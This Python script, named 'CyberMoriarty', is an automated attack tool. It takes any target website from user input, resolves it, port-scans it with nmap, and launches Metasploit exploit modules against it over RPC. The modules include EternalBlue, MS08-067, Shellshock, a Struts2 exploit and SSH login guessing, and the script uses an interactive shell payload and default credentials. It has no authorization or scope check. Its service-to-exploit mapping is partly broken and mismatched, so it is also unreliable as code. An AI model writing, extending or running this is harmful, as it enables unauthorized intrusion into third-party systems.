import socket
import requests
import nmap
import logging
from sklearn.ensemble import RandomForestClassifier
from pymetasploit3.msfrpc import MsfRpcClient
import subprocess
import time

class ThreatIntelligence:
    def __init__(self):
        self.malicious_ips = ["1.2.3.4", "5.6.7.8", "9.10.11.12"]

    def is_ip_malicious(self, ip_address):
        return ip_address in self.malicious_ips

class CyberMoriarty:
    def __init__(self):
        self.model = RandomForestClassifier()
        self.vulnerabilities = []
        self.exploit_suggestions = []
        self.attack_log = []
        self.target = None
        self.threat_intelligence = ThreatIntelligence()
        self.msfrpc_client = None
        self.start_metasploit_rpc()

    def start_metasploit_rpc(self):
        try:
            subprocess.Popen(['msfrpcd', '-P', 'CyberMoriarty', '-S'])
            time.sleep(5)  # Wait for msfrpcd to start
            self.msfrpc_client = MsfRpcClient('CyberMoriarty', ssl=False)
        except Exception as e:
            logging.error(f"Failed to start msfrpcd: {e}")

    def resolve_ip(self, website):
        try:
            self.target = socket.gethostbyname(website)
            print(f"Real IP address of {website}: {self.target}")
        except socket.gaierror:
            print(f"Error: {website} is not a valid website.")
            self.target = None

    def scan_target(self):
        if not self.target:
            print("Target not set.")
            return
        scanner = nmap.PortScanner()
        scanner.scan(self.target, arguments="-p1-1024 -T4")
        for host in scanner.all_hosts():
            for proto in scanner[host].all_protocols():
                lport = scanner[host][proto].keys()
                for port in lport:
                    self.vulnerabilities.append({
                        'host': host,
                        'port': port,
                        'name': scanner[host][proto][port]['name'],
                        'product': scanner[host][proto][port]['product']
                    })

    def suggest_exploits(self):
        common_exploits = {
            'SQL Injection': 'exploit/unix/webapp/phpmyadmin_pma_password',
            'Cross-Site Scripting (XSS)': 'exploit/multi/browser/firefox_xpi_bootstrapped_addon',
            'Remote Code Execution (RCE)': 'exploit/windows/smb/ms17_010_eternalblue',
            'Buffer Overflow': 'exploit/windows/smb/ms08_067_netapi',
            'File Inclusion': 'exploit/unix/webapp/php_include',
            'Command Injection': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
            'Directory Traversal': 'exploit/multi/http/dir_scanner',
            'Cross-Site Request Forgery (CSRF)': 'auxiliary/gather/phishery',
            'Authentication Bypass': 'exploit/windows/http/struts2_namespace_ognl',
            'Weak Passwords': 'auxiliary/scanner/ssh/ssh_login'
        }

        if self.vulnerabilities:
            for vulnerability in self.vulnerabilities:
                service = vulnerability['name']
                if service in common_exploits:
                    self.exploit_suggestions.append({
                        'port': vulnerability['port'],
                        'service': service,
                        'version': vulnerability['product'],
                        'exploit': common_exploits[service]
                    })

    def execute_attack(self):
        for suggestion in self.exploit_suggestions:
            try:
                if suggestion['exploit']:
                    exploit = self.msfrpc_client.modules.use('exploit', suggestion['exploit'])
                    exploit['RHOSTS'] = self.target
                    exploit['RPORT'] = suggestion['port']
                    exploit['USERNAME'] = 'admin'  # Replace with valid username
                    exploit['PASSWORD'] = 'password'  # Replace with valid password
                    payload = self.msfrpc_client.modules.use('payload', 'cmd/unix/interact')
                    result = exploit.execute(payload=payload)
                    status = 'Attack executed' if result['job_id'] else 'Attack failed'
                    
                    self.attack_log.append({
                        'port': suggestion['port'],
                        'service': suggestion['service'],
                        'status': status
                    })
                    print(f"Attack {status} on {suggestion['service']}:{suggestion['port']}")
                else:
                    self.attack_log.append({
                        'port': suggestion['port'],
                        'service': suggestion['service'],
                        'status': 'No known exploit'
                    })
            except Exception as e:
                logging.error(f"Failed to execute attack on {suggestion['service']}:{suggestion['port']}: {e}")
                self.attack_log.append({
                    'port': suggestion['port'],
                    'service': suggestion['service'],
                    'status': f'Attack failed: {e}'
                })

    def generate_report(self):
        report = "Cybersecurity Report\n"
        report += "====================\n\n"
        report += "Target: {}\n\n".format(self.target)
        report += "Vulnerabilities:\n"
        for vulnerability in self.vulnerabilities:
            report += "{}:{} - {}\n".format(vulnerability['host'], vulnerability['port'], vulnerability['name'])
        report += "\nExploit Suggestions:\n"
        for suggestion in self.exploit_suggestions:
            report += "{}:{} - {} - Suggested Exploit: {}\n".format(suggestion['port'], suggestion['service'], suggestion['version'], suggestion['exploit'])
        report += "\nAttack Log:\n"
        for log in self.attack_log:
            report += "{}:{} - {}\n".format(log['port'], log['service'], log['status'])
        with open("cybersecurity_report.txt", "w") as f:
            f.write(report)
        print("Cybersecurity report generated: cybersecurity_report.txt")

if __name__ == "__main__":
    tool = CyberMoriarty()
    target_website = input("Enter the target website: ")
    tool.resolve_ip(target_website)
    if tool.target:
        tool.scan_target()
        tool.suggest_exploits()
        tool.execute_attack()
        tool.generate_report()


